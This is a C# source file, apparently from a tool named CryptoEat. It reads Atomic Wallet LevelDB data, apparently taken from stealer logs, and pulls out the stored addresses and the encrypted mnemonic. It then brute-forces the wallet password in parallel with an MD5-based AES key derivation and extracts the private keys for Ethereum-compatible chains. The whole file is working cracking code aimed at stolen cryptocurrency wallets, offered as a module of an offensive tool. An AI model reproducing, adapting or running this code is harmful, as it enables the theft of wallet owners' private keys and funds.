using System.Security.Cryptography;
using System.Text;
using CryptoEat.Modules.Logs;
using CryptoEat.Modules.Wallet.Libs;
using LevelDB;
using Newtonsoft.Json;

namespace CryptoEat.Modules.Wallet;

internal class Atomic : IWallet
{
    private static readonly byte[] AddressKey =
        { 95, 102, 105, 108, 101, 58, 47, 47, 0, 1, 97, 100, 100, 114, 101, 115, 115, 101, 115 };

    private static readonly byte[] MnemoKey =
        { 95, 102, 105, 108, 101, 58, 47, 47, 0, 1, 119, 97, 108, 108, 101, 116, 115 };

    private static readonly string[] Patterns =
    {
        "ETH",
        "MATIC",
        "BSC",
        "FTM",
        "OP",
        "FLR",
        "ARB"
    };

    private readonly byte[] _mnemoEncrypted;
    internal readonly string MnemoBase64;

    public Atomic(string logPath)
    {
        using var options = new Options();
        options.CreateIfMissing = false;
        options.ParanoidChecks = false;
        using var db = new DB(options, logPath);
        try
        {
            var adr = Encoding.UTF8.GetString(db.Get(AddressKey).Skip(1).ToArray());

            var addreses = JsonConvert.DeserializeObject<AddressFile[]>(adr)!;

            var address = addreses.First(a => Patterns.Any(pat => pat == a.Id)).Address!;
            WalletInfo ??= new WalletInfo { Accounts = new List<Account> { new(address) } };

            MnemoBase64 =
                Encoding.UTF8.GetString(db.Get(MnemoKey, new ReadOptions { VerifyCheckSums = false }).Skip(1)
                    .ToArray());
            _mnemoEncrypted = Convert.FromBase64String(MnemoBase64);
        }
        catch
        {
            // handling
        }
        finally
        {
            db.Close();
            db.Dispose();
        }
    }

    public WalletInfo? WalletInfo { get; init; }
    public WalletType WalletName { get; init; } = WalletType.Atomic;

    public bool TryBrute(ref HashSet<string> passwords, out Output? mnemo, out string password)
    {
        return TryBruteCpu(ref passwords, out mnemo, out password);
    }

    public bool TryBruteCpu(ref HashSet<string> passwords, out Output? mnemo, out string password)
    {
        try
        {
            var salt = new byte[8];
            Array.Copy(_mnemoEncrypted, 8, salt, 0, 8);
            // Extract the encrypted content from the byte array
            var content = new byte[_mnemoEncrypted.Length - 16];
            Array.Copy(_mnemoEncrypted, 16, content, 0, _mnemoEncrypted.Length - 16);
            // Try each password in parallel

            var bruted = false;
            var mnemonic = "";
            var passwordTemp = "";

            Parallel.ForEach(passwords,
                new ParallelOptions { MaxDegreeOfParallelism = passwords.Count > 100 ? 100 : passwords.Count },
                (pass, state) =>
                {
                    var baseBytes = Encoding.UTF8.GetBytes(pass);
                    // Generate the key and IV for this password
                    var baseWithSalt = Combine(baseBytes, salt);
                    var hash1 = MD5.HashData(baseWithSalt);
                    var hash2 = MD5.HashData(Combine(hash1, baseWithSalt));
                    var hash3 = MD5.HashData(Combine(hash2, baseWithSalt));
                    var result = Combine(Combine(hash1, hash2), hash3);
                    var key = result.Take(32).ToArray();
                    var iv = result.Skip(32).Take(16).ToArray();
                    // Try to decrypt the content
                    using var aes = Aes.Create();
                    aes.Key = key;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    var decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
                    try
                    {
                        var output = decryptor.TransformFinalBlock(content, 0, content.Length);
                        // If the decryption was successful, print the password and stop the loop

                        mnemonic = Encoding.UTF8.GetString(output);
                        passwordTemp = pass;
                        bruted = true;
                        state.Stop();
                    }
                    catch (CryptographicException)
                    {
                        // If the decryption failed, just ignore the exception and try the next password
                    }
                });


            if (bruted)
            {
                password = passwordTemp;
                mnemo = GetOutput(mnemonic);
            }
            else
            {
                password = "";
                mnemo = Output.Empty;
            }

            return bruted;
        }
        catch
        {
            password = "";
            mnemo = Output.Empty;
            return false;
        }
    }

    public bool TryBruteGpu(ref HashSet<string> passwords, out Output? mnemo, out string password)
    {
        return TryBruteCpu(ref passwords, out mnemo, out password);
    }

    private static Output GetOutput(string rawOut)
    {
        try
        {
            var obj = JsonConvert.DeserializeObject<DecryptResult[]>(rawOut)!.Where(z => z.PrivateKey != null);
            return new Output
            {
                Accounts = new[]
                {
                    new Nethereum.Web3.Accounts.Account(obj.First(x => Patterns.Any(y => x.Id == y)).PrivateKey!)
                }
            };
        }
        catch
        {
            return Output.Empty;
        }
    }

    private static byte[] Combine(in byte[] first, in byte[] second)
    {
        return first.Concat(second).ToArray();
    }

    public class AddressFile
    {
        [JsonProperty("id")] public string? Id { get; set; }

        [JsonProperty("address")] public string? Address { get; set; }
    }

    public class DecryptResult
    {
        [JsonProperty("alias")] public string? Alias { get; set; }

        [JsonProperty("balance")] public string? Balance { get; set; }

        [JsonProperty("id")] public string? Id { get; set; }

        [JsonProperty("ticker")] public string? Ticker { get; set; }

        [JsonProperty("privateKey", NullValueHandling = NullValueHandling.Ignore)]
        public string? PrivateKey { get; set; }
    }
}